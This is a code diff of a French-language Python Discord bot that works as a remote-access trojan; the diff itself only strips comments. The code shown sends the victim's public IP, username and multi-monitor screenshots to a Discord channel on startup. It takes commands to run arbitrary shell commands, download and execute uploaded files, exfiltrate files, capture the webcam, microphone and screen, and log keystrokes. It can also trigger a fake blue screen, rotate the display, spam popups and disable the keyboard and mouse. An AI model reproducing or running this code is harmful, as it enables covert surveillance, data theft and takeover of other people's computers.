@@ -18,13 +18,13 @@ from scapy.all import sniff
 import pyttsx3
 import webbrowser
 import tkinter as tk
-from tkinter import messagebox  # ✅ IMPORT CORRECT
+from tkinter import messagebox 
 from threading import Thread
 import win32api
 import win32con
 import time
 import mss
-from screeninfo import get_monitors  # Utilisé pour détecter les écrans
+from screeninfo import get_monitors 
 import ctypes
 import threading
 from pydub import AudioSegment
@@ -36,19 +36,18 @@ import random
 HOST = "127.0.0.1"  
 PORT = 5000  
 
-TOKEN = "TON TOKEN"  # Remplace avec ton token de bot Discord
+TOKEN = "TON TOKEN"
 GUILD_ID = TA GUILD ID
 
 cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
 
 # Activer les intents
 intents = discord.Intents.default()
-intents.message_content = True  # Active la lecture des messages
+intents.message_content = True 
 
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 def get_public_ip():
-    """Récupère l'adresse IPv4 publique de la machine"""
     try:
         # Premier service pour récupérer l'IP publique
         response = requests.get("http://checkip.amazonaws.com")
@@ -64,7 +63,6 @@ def get_public_ip():
         return "Unknown_IP"
 
 def get_system_info():
-    """Retourne des informations sur le système local"""
     try:
         user_name = os.getlogin()  
         ip_address = get_public_ip() 
@@ -75,7 +73,6 @@ def get_system_info():
 
 @bot.command()
 async def upload(ctx, attachment: discord.Attachment = None):
-    """Télécharge et exécute un fichier de n'importe quel type"""
     try:
         if not attachment:
             await ctx.send("❌ Aucun fichier joint.")
@@ -112,7 +109,7 @@ async def on_ready():
         print("❌ Serveur introuvable.")
         return
 
-    ip_address = get_public_ip()  # Utilisation de TA fonction
+    ip_address = get_public_ip() 
     print(f"🌍 IP publique détectée : {ip_address}")
 
     category_name = f"Session-{ip_address}"
@@ -130,11 +127,10 @@ async def on_ready():
             session_channel = await existing_category.create_text_channel("session")
             print(f'📜 Salon "session" créé dans la catégorie existante {category_name}')
 
-    # Envoi des informations de la machine
+
     await session_channel.send("🖥 **Session Active ! Voici les informations du système :**")
     await session_channel.send(get_system_info())
 
-    # Détection des écrans
     screens = get_monitors()
     screen_count = len(screens)
 
@@ -145,10 +141,8 @@ async def on_ready():
             try:
                 filename = f"screen_{i}.png"
                 
-                # Capture l’écran avec MSS en utilisant l’ID du moniteur
                 screen = sct.grab(sct.monitors[i + 1])  # `i + 1` car `mss.monitors[0]` est tout l'écran
                 
-                # Sauvegarde et envoie
                 mss.tools.to_png(screen.rgb, screen.size, output=filename)
                 await session_channel.send(f"🖥 **Écran {i} capturé :**", file=discord.File(filename))
                 os.remove(filename)
@@ -163,7 +157,6 @@ async def on_ready():
 
 @bot.command()
 async def exec(ctx, *, command: str):
-    """Exécute une commande shell sur le PC"""
     try:
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
         output = result.stdout if result.stdout else result.stderr
@@ -173,7 +166,6 @@ async def exec(ctx, *, command: str):
 
 @bot.command()
 async def cd(ctx, *, path: str = None):
-    """Change de dossier (comme cd en cmd)"""
     global user_paths
 
     if ctx.author.id not in user_paths:
@@ -195,7 +187,6 @@ async def cd(ctx, *, path: str = None):
 
 @bot.command()
 async def ls(ctx):
-    """Liste les fichiers et dossiers du dossier actuel"""
     global user_paths
 
     if ctx.author.id not in user_paths:
@@ -212,7 +203,6 @@ async def ls(ctx):
 
 @bot.command()
 async def pwd(ctx):
-    """Affiche le chemin du dossier actuel"""
     global user_paths
 
     if ctx.author.id not in user_paths:
@@ -224,7 +214,6 @@ async def pwd(ctx):
 
 @bot.command()
 async def getfile(ctx, filename: str):
-    """Envoie un fichier du PC"""
     if os.path.exists(filename):
         await ctx.send(file=discord.File(filename))
     else:
@@ -233,7 +222,6 @@ async def getfile(ctx, filename: str):
 
 @bot.command()
 async def photo(ctx):
-    """Prend une photo avec la webcam et l'envoie sur Discord"""
     try:
         cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)  
         ret, frame = cam.read()
@@ -250,7 +238,6 @@ async def photo(ctx):
 
 @bot.command()
 async def shutdown(ctx):
-    """Éteint le PC"""
     await ctx.send("⚠️ **Attention !** Le PC va s'éteindre dans 10 secondes...")
     await asyncio.sleep(10)  
     if os.name == "nt":  
@@ -260,7 +247,6 @@ async def shutdown(ctx):
 
 @bot.command()
 async def restart(ctx):
-    """Redémarre le PC"""
     await ctx.send("🔄 **Le PC va redémarrer dans 10 secondes...**")
     await asyncio.sleep(10)
     if os.name == "nt":  
@@ -270,7 +256,6 @@ async def restart(ctx):
 
 @bot.command()
 async def lock(ctx):
-    """Verrouille la session (Windows uniquement)"""
     if os.name == "nt": 
         await ctx.send("🔒 **Verrouillage de la session...**")
         os.system("rundll32.exe user32.dll,LockWorkStation")
@@ -281,7 +266,6 @@ async def lock(ctx):
 
 @bot.command()
 async def wallpaper(ctx, url: str):
-    """Change le fond d'écran avec une image donnée en URL"""
     try:
         await ctx.send("🖼️ **Changement du fond d'écran...**")
 
@@ -306,7 +290,6 @@ async def wallpaper(ctx, url: str):
 
 @bot.command()
 async def type(ctx, *, text: str):
-    """Simule la frappe clavier sur l'ordinateur"""
     try:
         await ctx.send(f"⌨️ **Saisie en cours :** `{text}`")
         pyautogui.write(text, interval=0.05)  
@@ -316,7 +299,6 @@ async def type(ctx, *, text: str):
 
 @bot.command()
 async def screenshot(ctx):
-    """Prend un screenshot et l'envoie sur Discord"""
     try:
         await ctx.send("📸 **Capture d'écran en cours...**")
         screenshot_path = "screenshot.png"
@@ -330,7 +312,6 @@ async def screenshot(ctx):
 
 @bot.command()
 async def record(ctx, screen_number: int, duration: int = 5):
-    """Capture une vidéo d'un écran spécifique pendant X secondes"""
     try:
         with mss.mss() as sct:
             monitors = sct.monitors  
@@ -363,7 +344,6 @@ async def record(ctx, screen_number: int, duration: int = 5):
 
 @bot.command()
 async def record_audio(ctx, duration: int = 5):
-    """Enregistre l'audio du micro et l'envoie sur Discord"""
     try:
         await ctx.send(f"🎤 **Enregistrement audio pour {duration} secondes...**")
 
@@ -403,7 +383,6 @@ async def record_audio(ctx, duration: int = 5):
 
 @bot.command()
 async def tasklist(ctx):
-    """Liste TOUS les processus en cours en plusieurs messages si nécessaire"""
     try:
         await ctx.send("📋 **Récupération de la liste des processus...**")
 
@@ -429,7 +408,6 @@ async def tasklist(ctx):
 
 @bot.command()
 async def kill(ctx, process_name: str):
-    """Ferme une application par son nom"""
     try:
         await ctx.send(f"❌ **Fermeture de `{process_name}`...**")
 
@@ -446,7 +424,6 @@ async def kill(ctx, process_name: str):
 
 @bot.command()
 async def system(ctx):
-    """Affiche les infos système : CPU, RAM, Disque et Périphériques connectés"""
     try:
         
         cpu_usage = psutil.cpu_percent(interval=1)
@@ -484,7 +461,6 @@ async def system(ctx):
 
 @bot.command()
 async def file(ctx, action: str, *args):
-    """Commande multi-fonctions pour gérer les fichiers (ls, delete, rename, download, find)"""
     try:
         if action == "ls":  
             path = args[0] if args else "."  
@@ -561,7 +537,6 @@ async def file(ctx, action: str, *args):
 
 @bot.command()
 async def tts(ctx, *, text: str):
-    """Fait parler le PC avec un message TTS"""
     try:
         engine = pyttsx3.init()
         engine.say(text)
@@ -572,7 +547,6 @@ async def tts(ctx, *, text: str):
 
 @bot.command()
 async def open(ctx, url: str):
-    """Ouvre un site web dans le navigateur"""
     try:
         webbrowser.open(url)
         await ctx.send(f"🌐 **Ouverture de :** `{url}`")
@@ -580,16 +554,15 @@ async def open(ctx, url: str):
         await ctx.send(f"⚠️ Erreur : {e}")
 
 def show_popup(message):
-    """Affiche une pop-up avec un message flippant"""
     root = tk.Tk()
     root.withdraw()  # Masque la fenêtre principale
-    messagebox.showwarning("Alerte ⚠️", message)  # ✅ UTILISE `messagebox.showwarning()`
+    messagebox.showwarning("Alerte ⚠️", message) 
     root.destroy()
 
 @bot.command()
 async def popup(ctx, *, message: str):
     try:
-        Thread(target=show_popup, args=(message,)).start()  # ✅ Lance la pop-up dans un thread
+        Thread(target=show_popup, args=(message,)).start() 
         await ctx.send(f"👁 **Pop-up affichée :** `{message}`")
     except Exception as e:
         await ctx.send(f"⚠️ Erreur : {e}")
@@ -632,7 +605,6 @@ async def write(ctx, *, message: str):
 
 @bot.command()
 async def ip_info(ctx, ip: str):
-    """Affiche des informations sur une adresse IP"""
     try:
         await ctx.send(f"🌍 **Recherche d'infos sur `{ip}`...**")
         response = requests.get(f"http://ip-api.com/json/{ip}")
@@ -656,7 +628,6 @@ async def ip_info(ctx, ip: str):
 
 @bot.command()
 async def fake_crash(ctx):
-    """Simule un BSOD (écran bleu de la mort)"""
     if os.name == "nt":  
         await ctx.send("💀 **Lancement du Blue Screen...**")
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
@@ -667,12 +638,10 @@ async def fake_crash(ctx):
 flipping = False  # Variable globale pour arrêter le flip
 
 def set_screen_rotation(angle):
-    """Modifie l'orientation de l'écran en utilisant win32api"""
     try:
         device = win32api.EnumDisplayDevices(None, 0)
         settings = win32api.EnumDisplaySettings(device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)
 
-        # Définition de l'angle en fonction de la rotation demandée
         if angle == 0:
             settings.DisplayOrientation = win32con.DMDO_DEFAULT  # Normal
         elif angle == 90:
@@ -689,7 +658,6 @@ def set_screen_rotation(angle):
 
 @bot.command()
 async def random_flip(ctx, duration: int = 30):
-    """Tourne l'écran aléatoirement toutes les X secondes"""
     global flipping
     if flipping:
         await ctx.send("❌ **Le mode Random Flip est déjà activé !**")
@@ -713,7 +681,6 @@ async def random_flip(ctx, duration: int = 30):
 
 @bot.command()
 async def stop_flip(ctx):
-    """Arrête le mode Random Flip et remet l'écran normal"""
     global flipping
     flipping = False
     set_screen_rotation(0)  # Remet l'écran normal
@@ -721,7 +688,6 @@ async def stop_flip(ctx):
     
 @bot.command()
 async def play_sound(ctx, file: str):
-    """Joue un son sur le PC avec pydub"""
     try:
         if os.path.exists(file):
             await ctx.send(f"🔊 **Lecture de `{file}`...**")
@@ -734,7 +700,6 @@ async def play_sound(ctx, file: str):
 
 @bot.command()
 async def spam_popup(ctx, message: str, count: int = 5):
-    """Ouvre des pop-ups en boucle"""
     await ctx.send(f"💀 **Lancement du spam de pop-ups ({count} fois)...**")
 
     def popup_spam():
@@ -748,7 +713,6 @@ async def spam_popup(ctx, message: str, count: int = 5):
 
 @bot.command()
 async def disable_keyboard(ctx, duration: int):
-    """Désactive le clavier temporairement"""
     await ctx.send(f"⛔ **Clavier désactivé pendant {duration} secondes !**")
 
     def block_keys():
@@ -762,7 +726,6 @@ async def disable_keyboard(ctx, duration: int):
 
 @bot.command()
 async def disable_mouse(ctx, duration: int):
-    """Désactive la souris temporairement"""
     await ctx.send(f"🛑 **Souris désactivée pendant {duration} secondes !**")
 
     mouse = Controller()
@@ -780,7 +743,6 @@ async def disable_mouse(ctx, duration: int):
 
 @bot.command()
 async def live_screenshot(ctx, interval: int, duration: int):
-    """Prend des screenshots automatiquement toutes les X secondes"""
     await ctx.send(f"📸 **Mode Screenshot Auto activé ! Capture toutes les `{interval}` secondes pendant `{duration}` secondes.**")
 
     end_time = time.time() + duration
